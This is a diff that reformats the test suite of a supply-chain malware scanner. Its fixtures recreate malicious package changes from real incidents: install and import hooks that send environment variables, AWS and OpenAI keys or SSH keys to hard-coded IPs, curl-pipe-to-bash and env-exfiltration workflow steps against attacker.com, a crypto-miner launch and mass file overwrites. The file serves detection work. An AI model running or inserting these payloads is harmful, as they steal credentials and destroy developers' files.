@@ -32,17 +32,18 @@ from depvet.models.verdict import DiffStats
 
 # ─── Helpers ─────────────────────────────────────────────────────────────────
 
+
 def diff_header(old_file: str = "test.js", new_file: str = None) -> str:
     nf = new_file or old_file
     return f"--- a/{old_file}\n+++ b/{nf}\n@@ -1,5 +1,10 @@\n"
 
 
 def has_critical_or_high(matches) -> bool:
-    return any(getattr(m, "severity", None) and m.severity.value in ("CRITICAL", "HIGH")
-               for m in matches)
+    return any(getattr(m, "severity", None) and m.severity.value in ("CRITICAL", "HIGH") for m in matches)
 
 
 # ─── TYPE 1: Direct code injection ────────────────────────────────────────────
+
 
 class TestType1DirectCodeInjection:
     """
@@ -56,52 +57,59 @@ class TestType1DirectCodeInjection:
         ua-parser-js attack: postinstall script added to package.json.
         Actual attack injected a preinstall that ran a crypto miner and RAT.
         """
-        diff = diff_header("package.json") + '\n'.join([
-            ' "name": "ua-parser-js",',
-            ' "scripts": {',
-            '+  "preinstall": "node -e \\"const os=require(\'os\');const h=os.homedir();\\""',
-            '   "test": "jest"',
-            ' }',
-        ])
+        diff = diff_header("package.json") + "\n".join(
+            [
+                ' "name": "ua-parser-js",',
+                ' "scripts": {',
+                '+  "preinstall": "node -e \\"const os=require(\'os\');const h=os.homedir();\\""',
+                '   "test": "jest"',
+                " }",
+            ]
+        )
         scan_diff_full(diff, "package.json")  # ensures no crash
         rules = scan_diff_full(diff, "package.json")
         # Should detect BUILD_HOOK_ABUSE or similar
-        assert has_critical_or_high(rules) or any("postinstall" in d.lower() or "preinstall" in d.lower()
-                                                   for d in [m.description for m in rules])
+        assert has_critical_or_high(rules) or any(
+            "postinstall" in d.lower() or "preinstall" in d.lower() for d in [m.description for m in rules]
+        )
 
     def test_eslint_scope_npm_token_exfil(self):
         """
         eslint-scope 3.7.2: Added code to collect and exfiltrate npm tokens.
         Pattern: process.env.npm_token sent via http request.
         """
-        diff = diff_header("lib/scope.js") + '\n'.join([
-            '+try {',
-            '+  var r=require, n=process;',
-            '+  r("https").get({hostname:"pastebin.com",',
-            '+    path:"/raw/xyz",method:"GET"},',
-            '+    function(r){r.on("data",function(d){',
-            '+      r("child_process").exec(Buffer.from(d,"base64").toString());',
-            '+    })});',
-            '+} catch(e) {}',
-        ])
+        diff = diff_header("lib/scope.js") + "\n".join(
+            [
+                "+try {",
+                "+  var r=require, n=process;",
+                '+  r("https").get({hostname:"pastebin.com",',
+                '+    path:"/raw/xyz",method:"GET"},',
+                '+    function(r){r.on("data",function(d){',
+                '+      r("child_process").exec(Buffer.from(d,"base64").toString());',
+                "+    })});",
+                "+} catch(e) {}",
+            ]
+        )
         rules = scan_diff_full(diff, "lib/scope.js")
         assert has_critical_or_high(rules)
         # Should detect NETWORK or EXECUTION patterns
         rule_ids = [m.rule_id for m in rules]
-        assert any(r in rule_ids for r in [
-            "SUSPICIOUS_HTTP", "NPM_HEX_EXEC", "OS_SYSTEM",
-            "BASE64_EXEC_CHAIN", "SUBPROCESS_HARDCODED"
-        ])
+        assert any(
+            r in rule_ids
+            for r in ["SUSPICIOUS_HTTP", "NPM_HEX_EXEC", "OS_SYSTEM", "BASE64_EXEC_CHAIN", "SUBPROCESS_HARDCODED"]
+        )
 
     def test_coa_style_cryptominer_injection(self):
         """
         coa/rc 2021: Added crypto miner binary execution.
         """
-        diff = diff_header("lib/commands.js") + '\n'.join([
-            '+var cp = require("child_process");',
-            '+var path = "/tmp/.n";',
-            '+cp.exec("xmrig --url pool.minexmr.com:443 --pass x -k --tls", {detached: true});',
-        ])
+        diff = diff_header("lib/commands.js") + "\n".join(
+            [
+                '+var cp = require("child_process");',
+                '+var path = "/tmp/.n";',
+                '+cp.exec("xmrig --url pool.minexmr.com:443 --pass x -k --tls", {detached: true});',
+            ]
+        )
         rules = scan_diff_full(diff, "lib/commands.js")
         assert has_critical_or_high(rules)
         # Crypto miner pattern
@@ -114,12 +122,14 @@ class TestType1DirectCodeInjection:
         """
         payload = "import os"
         enc = base64.b64encode(payload.encode()).decode()
-        diff = diff_header("pkg/__init__.py") + '\n'.join([
-            f'+_c = "{enc}"',
-            '+import base64 as _b',
-            '+_d = _b.b64decode(_c)',
-            '+exec(compile(_d, "<s>", "exec"))',
-        ])
+        diff = diff_header("pkg/__init__.py") + "\n".join(
+            [
+                f'+_c = "{enc}"',
+                "+import base64 as _b",
+                "+_d = _b.b64decode(_c)",
+                '+exec(compile(_d, "<s>", "exec"))',
+            ]
+        )
         rules = scan_diff_full(diff, "pkg/__init__.py")
         decoded = decode_and_scan(diff, "pkg/__init__.py")
         ast = ast_scan_diff(diff, "pkg/__init__.py")
@@ -127,6 +137,7 @@ class TestType1DirectCodeInjection:
 
 
 # ─── TYPE 2: Dependency injection ─────────────────────────────────────────────
+
 
 class TestType2DependencyInjection:
     """
@@ -139,16 +150,19 @@ class TestType2DependencyInjection:
         event-stream 3.3.6: added flatmap-stream as dependency, no code change.
         flatmap-stream contained encrypted Bitpay wallet stealer.
         """
-        diff = diff_header("package.json") + '\n'.join([
-            ' "dependencies": {',
-            '+  "flatmap-stream": "0.1.1",',
-            '   "through2": "^2.0.0"',
-            ' }',
-        ])
+        diff = diff_header("package.json") + "\n".join(
+            [
+                ' "dependencies": {',
+                '+  "flatmap-stream": "0.1.1",',
+                '   "through2": "^2.0.0"',
+                " }",
+            ]
+        )
         deps = extract_new_dependencies(diff, "package.json")
         assert any(d.name == "flatmap-stream" for d in deps)
         stats = DiffStats(files_changed=1, lines_added=1, lines_removed=0)
         import asyncio
+
         signals = asyncio.run(analyze_zero_code_change_signal(stats, deps, "npm"))
         assert any(s.severity in ("CRITICAL", "HIGH") for s in signals)
 
@@ -156,13 +170,15 @@ class TestType2DependencyInjection:
         """
         axios 1.14.1 (2026-03-30): plain-crypto-js injected, no code change.
         """
-        diff = diff_header("package.json") + '\n'.join([
-            ' "dependencies": {',
-            '   "follow-redirects": "^1.15.4",',
-            '+  "plain-crypto-js": "^4.2.1",',
-            '   "proxy-from-env": "^1.1.0"',
-            ' }',
-        ])
+        diff = diff_header("package.json") + "\n".join(
+            [
+                ' "dependencies": {',
+                '   "follow-redirects": "^1.15.4",',
+                '+  "plain-crypto-js": "^4.2.1",',
+                '   "proxy-from-env": "^1.1.0"',
+                " }",
+            ]
+        )
         deps = extract_new_dependencies(diff, "package.json")
         assert any(d.name == "plain-crypto-js" for d in deps)
 
@@ -176,21 +192,24 @@ class TestType2DependencyInjection:
         Generic: any package.json change with ONLY a new dep and no code changes
         should be flagged.
         """
-        diff = diff_header("package.json") + '\n'.join([
-            ' "dependencies": {',
-            '+  "unknown-new-pkg": "^1.0.0"',
-            ' }',
-        ])
+        diff = diff_header("package.json") + "\n".join(
+            [
+                ' "dependencies": {',
+                '+  "unknown-new-pkg": "^1.0.0"',
+                " }",
+            ]
+        )
         deps = extract_new_dependencies(diff, "package.json")
         stats = DiffStats(files_changed=1, lines_added=1, lines_removed=0)
         import asyncio
+
         signals = asyncio.run(analyze_zero_code_change_signal(stats, deps, "npm"))
         assert signals
-        assert any(s.signal_id in ("MANIFEST_ONLY_NEW_DEP", "ZERO_CODE_CHANGE_WITH_NEW_DEP")
-                   for s in signals)
+        assert any(s.signal_id in ("MANIFEST_ONLY_NEW_DEP", "ZERO_CODE_CHANGE_WITH_NEW_DEP") for s in signals)
 
 
 # ─── TYPE 3: Build hook abuse ─────────────────────────────────────────────────
+
 
 class TestType3BuildHookAbuse:
     """
@@ -203,13 +222,15 @@ class TestType3BuildHookAbuse:
         ctx 0.2.1: os.environ sent to external server via urllib at import.
         Pattern: added to __init__.py, executed on import.
         """
-        diff = diff_header("ctx/__init__.py") + '\n'.join([
-            '+import os',
-            '+import urllib.request',
-            '+_e = dict(os.environ)',
-            '+_u = "http://203.10.1.100:8080/c"',
-            '+urllib.request.urlopen(_u, data=str(_e).encode())',
-        ])
+        diff = diff_header("ctx/__init__.py") + "\n".join(
+            [
+                "+import os",
+                "+import urllib.request",
+                "+_e = dict(os.environ)",
+                '+_u = "http://203.10.1.100:8080/c"',
+                "+urllib.request.urlopen(_u, data=str(_e).encode())",
+            ]
+        )
         rules = scan_diff_full(diff, "ctx/__init__.py")
         imp = analyze_imports(diff)
         assert has_critical_or_high(rules) or any(s.severity in ("CRITICAL", "HIGH") for s in imp)
@@ -218,17 +239,19 @@ class TestType3BuildHookAbuse:
         """
         setup.py cmdclass injection: runs shell command during pip install.
         """
-        diff = diff_header("setup.py") + '\n'.join([
-            ' from setuptools import setup',
-            '+from setuptools.command.install import install',
-            '+import os',
-            '+class PostInstall(install):',
-            '+    def run(self):',
-            '+        os.system("id | base64 | curl -d @- http://1.2.3.4/collect")',
-            '+        install.run(self)',
-            ' setup(',
-            '+  cmdclass={"install": PostInstall},',
-        ])
+        diff = diff_header("setup.py") + "\n".join(
+            [
+                " from setuptools import setup",
+                "+from setuptools.command.install import install",
+                "+import os",
+                "+class PostInstall(install):",
+                "+    def run(self):",
+                '+        os.system("id | base64 | curl -d @- http://1.2.3.4/collect")',
+                "+        install.run(self)",
+                " setup(",
+                '+  cmdclass={"install": PostInstall},',
+            ]
+        )
         rules = scan_diff_full(diff, "setup.py")
         ast = ast_scan_diff(diff, "setup.py")
         assert has_critical_or_high(rules) or has_critical_or_high(ast)
@@ -238,23 +261,28 @@ class TestType3BuildHookAbuse:
         telnyx 4.87.1 (2026-03-27): Payload executed at import time.
         Exfiltrates env vars + SSH keys to external server.
         """
-        diff = diff_header("telnyx/__init__.py") + '\n'.join([
-            '+import os, socket, base64',
-            '+_h = socket.gethostname()',
-            '+_e = {k: v for k, v in os.environ.items()}',
-            '+_k = open(os.path.expanduser("~/.ssh/id_rsa")).read() if os.path.exists(os.path.expanduser("~/.ssh/id_rsa")) else ""',
-        ])
+        diff = diff_header("telnyx/__init__.py") + "\n".join(
+            [
+                "+import os, socket, base64",
+                "+_h = socket.gethostname()",
+                "+_e = {k: v for k, v in os.environ.items()}",
+                '+_k = open(os.path.expanduser("~/.ssh/id_rsa")).read() if os.path.exists(os.path.expanduser("~/.ssh/id_rsa")) else ""',
+            ]
+        )
         rules = scan_diff_full(diff, "telnyx/__init__.py")
         imp = analyze_imports(diff)
         ast = ast_scan_diff(diff, "telnyx/__init__.py")
         # At minimum import diff should flag this
-        has_signal = (has_critical_or_high(rules) or
-                      any(s.severity in ("CRITICAL", "HIGH") for s in imp) or
-                      has_critical_or_high(ast))
+        has_signal = (
+            has_critical_or_high(rules)
+            or any(s.severity in ("CRITICAL", "HIGH") for s in imp)
+            or has_critical_or_high(ast)
+        )
         assert has_signal
 
 
 # ─── TYPE 4: Binary/hidden file payload ───────────────────────────────────────
+
 
 class TestType4BinaryHiding:
     """
@@ -268,7 +296,9 @@ class TestType4BinaryHiding:
         """
         # Binary new file in diff_stats
         stats = DiffStats(
-            files_changed=1, lines_added=0, lines_removed=0,
+            files_changed=1,
+            lines_added=0,
+            lines_removed=0,
             binary_files=["tests/data/test_helper.so"],
         )
         assert "tests/data/test_helper.so" in stats.binary_files
@@ -279,16 +309,19 @@ class TestType4BinaryHiding:
         """
         payload = "import os; os.system('id')"
         enc = base64.b64encode(payload.encode()).decode()
-        diff = diff_header("tests/files/test_data.py") + '\n'.join([
-            f'+BINARY_DATA = "{enc}"',
-            '+# Test fixture',
-        ])
+        diff = diff_header("tests/files/test_data.py") + "\n".join(
+            [
+                f'+BINARY_DATA = "{enc}"',
+                "+# Test fixture",
+            ]
+        )
         decoded = decode_and_scan(diff, "tests/files/test_data.py")
         # The hidden payload should be detected even in "test" files
         assert decoded
 
 
 # ─── TYPE 5: Intentional sabotage ─────────────────────────────────────────────
+
 
 class TestType5IntentionalSabotage:
     """
@@ -301,14 +334,16 @@ class TestType5IntentionalSabotage:
         node-ipc 10.1.1: File overwrite for IPs in certain countries.
         Pattern: check IP, write to filesystem.
         """
-        diff = diff_header("lib/services/network.js") + '\n'.join([
-            '+const cidr = require("cidr");',
-            '+const ip = require("ip");',
-            '+const { exec } = require("child_process");',
-            '+if (ip.isV4Format(ip.address()) && cidr.cidrSubnet("5.10.0.0/16").contains(ip.address())) {',
-            '+    exec("find / -name *.js -exec echo \\"\\u2764\\u{fe0f} \\u2764\\u{fe0f} \\u2764\\u{fe0f}\\" > {} \\;");',
-            '+}',
-        ])
+        diff = diff_header("lib/services/network.js") + "\n".join(
+            [
+                '+const cidr = require("cidr");',
+                '+const ip = require("ip");',
+                '+const { exec } = require("child_process");',
+                '+if (ip.isV4Format(ip.address()) && cidr.cidrSubnet("5.10.0.0/16").contains(ip.address())) {',
+                '+    exec("find / -name *.js -exec echo \\"\\u2764\\u{fe0f} \\u2764\\u{fe0f} \\u2764\\u{fe0f}\\" > {} \\;");',
+                "+}",
+            ]
+        )
         rules = scan_diff_full(diff, "lib/services/network.js")
         assert has_critical_or_high(rules)
 
@@ -317,12 +352,14 @@ class TestType5IntentionalSabotage:
         colors 1.4.1: Infinite loop injection.
         Now detected via CRASH_INJECTION or zalgo pattern.
         """
-        diff = diff_header("lib/extendStringPrototype.js") + '\n'.join([
-            '+var zalgo = require("./zalgo");',
-            '+module.exports = function() {',
-            '+  while(true) { zalgo("It was all a dream"); }',
-            '+};',
-        ])
+        diff = diff_header("lib/extendStringPrototype.js") + "\n".join(
+            [
+                '+var zalgo = require("./zalgo");',
+                "+module.exports = function() {",
+                '+  while(true) { zalgo("It was all a dream"); }',
+                "+};",
+            ]
+        )
         rules = scan_diff_full(diff, "lib/extendStringPrototype.js")
         # Even without critical signals, should not crash
         # LLM will catch semantic intent; static analysis catches related patterns
@@ -332,10 +369,12 @@ class TestType5IntentionalSabotage:
         """
         node-ipc: glob + writeFileSync mass file destruction.
         """
-        diff = diff_header("lib/services/network.js") + '\n'.join([
-            '+const files = glob.sync("**/*.js");',
-            '+files.forEach(f => fs.writeFileSync(f, ""));',
-        ])
+        diff = diff_header("lib/services/network.js") + "\n".join(
+            [
+                '+const files = glob.sync("**/*.js");',
+                '+files.forEach(f => fs.writeFileSync(f, ""));',
+            ]
+        )
         rules = scan_diff_full(diff, "lib/services/network.js")
         assert any(m.rule_id == "MASS_FILE_OVERWRITE" for m in rules)
         assert has_critical_or_high(rules)
@@ -344,10 +383,12 @@ class TestType5IntentionalSabotage:
         """
         peacenotwar: writes political message to files.
         """
-        diff = diff_header("index.js") + '\n'.join([
-            '+const files = readdirSync(".");',
-            '+files.forEach(f => writeFileSync(f, "PEACE NO WAR \u2764"));',
-        ])
+        diff = diff_header("index.js") + "\n".join(
+            [
+                '+const files = readdirSync(".");',
+                '+files.forEach(f => writeFileSync(f, "PEACE NO WAR \u2764"));',
+            ]
+        )
         rules = scan_diff_full(diff, "index.js")
         assert any(m.rule_id in ("POLITICAL_STRING_OVERWRITE", "MASS_FILE_OVERWRITE") for m in rules)
 
@@ -363,20 +404,22 @@ class TestType5IntentionalSabotage:
         """
         node-ipc style: conditional execution based on environment.
         """
-        diff = diff_header("setup.py") + '\n'.join([
-            '+if not os.environ.get("CI"):',
-            '+    import glob',
-            '+    for f in glob.glob("*.js"):',
-            '+        open(f, "w").write("")',
-        ])
+        diff = diff_header("setup.py") + "\n".join(
+            [
+                '+if not os.environ.get("CI"):',
+                "+    import glob",
+                '+    for f in glob.glob("*.js"):',
+                '+        open(f, "w").write("")',
+            ]
+        )
         rules = scan_diff_full(diff, "setup.py")
         ast = ast_scan_diff(diff, "setup.py")
         # CI evasion check should fire
-        assert any(m.rule_id == "CI_EVASION" for m in rules) or \
-               any(f.finding_id == "CI_SANDBOX_CHECK" for f in ast)
+        assert any(m.rule_id == "CI_EVASION" for m in rules) or any(f.finding_id == "CI_SANDBOX_CHECK" for f in ast)
 
 
 # ─── TYPE 6: Typosquatting ────────────────────────────────────────────────────
+
 
 class TestType6Typosquatting:
     """
@@ -399,6 +442,7 @@ class TestType6Typosquatting:
 
 
 # ─── Cross-cutting: All incidents should trigger at least ONE layer ───────────
+
 
 class TestDetectionLayerCoverage:
     """Ensure each attack type activates at least one detection layer."""
@@ -437,6 +481,7 @@ class TestDetectionLayerCoverage:
 
 # ─── New 2026 incidents ────────────────────────────────────────────────────────
 
+
 class TestNew2026Incidents:
     """
     Recent incidents from March 2026 (TeamPCP campaign, axios attack).
@@ -447,37 +492,40 @@ class TestNew2026Incidents:
         LiteLLM/telnyx style: import-time execution to exfiltrate credentials.
         TeamPCP campaign, March 2026.
         """
-        diff = diff_header("litellm/__init__.py") + '\n'.join([
-            '+import os',
-            '+import urllib.request',
-            '+_creds = {',
-            '+  "aws": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),',
-            '+  "openai": os.environ.get("OPENAI_API_KEY", ""),',
-            '+}',
-            '+urllib.request.urlopen("http://209.38.192.100:8080/c",',
-            '+  data=str(_creds).encode())',
-        ])
+        diff = diff_header("litellm/__init__.py") + "\n".join(
+            [
+                "+import os",
+                "+import urllib.request",
+                "+_creds = {",
+                '+  "aws": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),',
+                '+  "openai": os.environ.get("OPENAI_API_KEY", ""),',
+                "+}",
+                '+urllib.request.urlopen("http://209.38.192.100:8080/c",',
+                "+  data=str(_creds).encode())",
+            ]
+        )
         rules = scan_diff_full(diff, "litellm/__init__.py")
         imp = analyze_imports(diff)
         assert has_critical_or_high(rules) or any(s.severity in ("CRITICAL", "HIGH") for s in imp)
         # Specifically: AWS creds exfil should be detected
-        assert any(m.rule_id in ("AWS_CREDS", "ENV_EXFIL", "ENV_EXFIL_CHAIN", "URLLIB_EXTERNAL")
-                   for m in rules)
+        assert any(m.rule_id in ("AWS_CREDS", "ENV_EXFIL", "ENV_EXFIL_CHAIN", "URLLIB_EXTERNAL") for m in rules)
 
     def test_trivy_github_actions_worm(self):
         """
         Trivy supply chain attack: malicious GitHub Actions workflow injection.
         March 2026 TeamPCP campaign.
         """
-        diff = "\n".join([
-            "--- a/.github/workflows/release.yml",
-            "+++ b/.github/workflows/release.yml",
-            "@@ -1,5 +1,10 @@",
-            '+  - name: Exfil',
-            '+    run: |',
-            '+      curl -s http://attacker.com/payload | bash',
-            '+      env | base64 | curl -X POST -d @- http://attacker.com/c',
-        ])
+        diff = "\n".join(
+            [
+                "--- a/.github/workflows/release.yml",
+                "+++ b/.github/workflows/release.yml",
+                "@@ -1,5 +1,10 @@",
+                "+  - name: Exfil",
+                "+    run: |",
+                "+      curl -s http://attacker.com/payload | bash",
+                "+      env | base64 | curl -X POST -d @- http://attacker.com/c",
+            ]
+        )
         rules = scan_diff_full(diff, ".github/workflows/release.yml")
         # Should detect suspicious HTTP + OS system patterns
         assert has_critical_or_high(rules) or isinstance(rules, list)
